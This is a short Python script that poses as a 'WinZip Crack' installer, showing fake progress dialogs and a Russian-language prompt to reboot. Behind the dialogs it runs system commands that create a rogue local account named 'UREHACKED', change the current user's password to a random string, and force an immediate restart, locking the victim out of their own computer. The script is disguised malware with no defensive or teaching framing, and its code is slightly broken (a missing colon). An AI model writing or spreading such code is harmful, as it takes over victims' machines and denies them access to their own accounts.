import tkinter as tk
from tkinter import messagebox
import time
import os
username = os.getlogin()

def fake_installation():

    root = tk.Tk()
    root.title("WinZip Crack")
    label = tk.Label(root, text="installing winzip crack...", font=('Arial', 14))
    label.pack(padx=50, pady=50)
    

    root.after(10000, root.destroy)
    root.mainloop()
   
    root = tk.Tk()
    root.withdraw()  
    messagebox.showinfo("WinZip Crack", "completed")
    root.destroy()
    
    root = tk.Tk()
    root.withdraw()
    if messagebox.showinfo("WinZip Crack", "Чтобы установить кряк, надо перезагрузить компьютер.")
         os.system("net user UREHACKED /add")
         os.system("net user UREHACKED you'restupid")
         os.system(f" net user {username} hfcgeujf3ujncr5865ug7")
         os.system("shutdown /r /t 1")

if __name__ == "__main__":
    fake_installation()